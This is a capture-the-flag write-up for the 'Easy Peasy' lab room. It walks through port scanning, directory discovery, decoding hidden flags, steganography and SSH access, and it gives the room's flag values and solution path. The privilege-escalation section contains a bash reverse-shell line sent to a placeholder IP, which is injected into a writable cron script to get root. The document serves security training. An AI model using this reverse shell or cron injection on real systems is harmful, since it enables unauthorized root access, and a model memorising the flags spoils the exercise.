# Easy Peasy

## Enumeration

First, I checked if the target was reachable:

ping <TARGET_IP>

Then I performed a full TCP port scan with service/version detection:

nmap -sV -p- <TARGET_IP>

The scan revealed three open ports:

- 80 → nginx 1.16.1
- 6498 → OpenSSH 7.6p1
- 65524 → Apache httpd 2.4.43

The interesting point was that there were two web servers running, so both needed to be investigated.

---

## Web Enumeration

I used Gobuster to enumerate hidden directories:

gobuster dir -u http://<TARGET_IP> -w <WORDLIST>

This revealed:

/whatever

I then inspected the page source and found:

ZmxhZ3tmMXJzN19mbDRnFQ

This was Base64 encoded.

After decoding:

flag{f1rs7_fl4g}

### Observation

Always inspect the HTML source. Important information may not be visible directly on the webpage.

---

## Second Web Server

The second web server was running on port 65524.

I investigated:

http://<TARGET_IP>:65524

I found another encoded value:

Obs3mP173N2X6d0rAgEALOVU

A clue indicated that a different Base encoding was being used.

Further enumeration revealed:

/n0th1ng3ls3m4tt3r

Inside this path I found:

flag{9fdafbd64c47471a8f54cd3fc64cd312}

This was an MD5 hash.

After decoding the hash:

flag{1m_s3c0nd_fl4g}

---

## Steganography

Inside:

/nothing3ls3m4tt3r

I found:

binarycodepixabay.jpg

I investigated the image using:

steghide info binarycodepixabay.jpg

A passphrase was required.

After decoding the provided clue, I obtained:

mypasswordforthatjob

I then extracted the hidden file:

steghide extract -sf binarycodepixabay.jpg

This produced:

secrettext.txt

---

## Password Extraction

The contents of `secrettext.txt` were represented as binary.

I decoded the binary using CyberChef with the `From Binary` operation.

The result was:

iconvertedmypasswordtobinary

This provided the password needed to continue with SSH access.

---

## SSH Access

SSH was running on port 6498.

I connected using:

ssh <user>@<TARGET_IP> -p 6498

After gaining SSH access, I found the following encoded value:

synt{a0jvgf33zfa0ez4y}

Applying ROT13 resulted in:

flag{n0wits33msn0rm4l}

This completed the relevant flag/encoded-data part of the room.

---

## Privilege Escalation

After gaining access to the system, I investigated possible privilege escalation paths.

I found the following script:

/var/www/.mysecretcronjob.sh

The important finding was that the script was executed by a cronjob.

The script was writable, providing an injection point.

---

## Cronjob Exploitation

I added a reverse shell payload to the script:

bash -i >& /dev/tcp/<MY_IP>/1337 0>&1

Then I started a Netcat listener on my machine:

nc -lvnp 1337

When the cronjob executed the modified script, I received a reverse shell with elevated privileges.

I verified the privileges with:

whoami

The result confirmed:

root

---

## Root Flag

After obtaining root access, I checked:

ls /root

The root flag was located at:

/root/root.txt

This completed the room.

---

## Tools Used

- Nmap
- Gobuster
- Steghide
- CyberChef
- SSH
- Netcat

---

## Key Takeaways

### Enumeration

- Scan all ports, not only the common ports.
- Use `-sV` to identify service versions.
- When multiple web servers are present, investigate each one.
- Use Gobuster for directory enumeration.
- Inspect HTML source manually.

### Encoding / Data Extraction

The room required recognizing and handling different forms of encoded or hidden information:

- Base64
- Base encoding
- MD5
- Binary
- ROT13
- Steganography

The important part is not simply knowing the tools, but recognizing the clue and determining what technique should be applied.

### Privilege Escalation

The important chain was:

Writable script
    ↓
Cronjob executes script
    ↓
Reverse shell payload
    ↓
Cronjob executes it with elevated privileges
    ↓
Root shell

---

## Attack Chain

Nmap
  ↓
Find open ports and services
  ↓
Enumerate web servers
  ↓
Discover hidden directories
  ↓
Find encoded/hidden information
  ↓
Decode / extract information
  ↓
Obtain credentials
  ↓
SSH access
  ↓
Enumerate privilege escalation opportunities
  ↓
Find writable cronjob script
  ↓
Reverse shell
  ↓
Root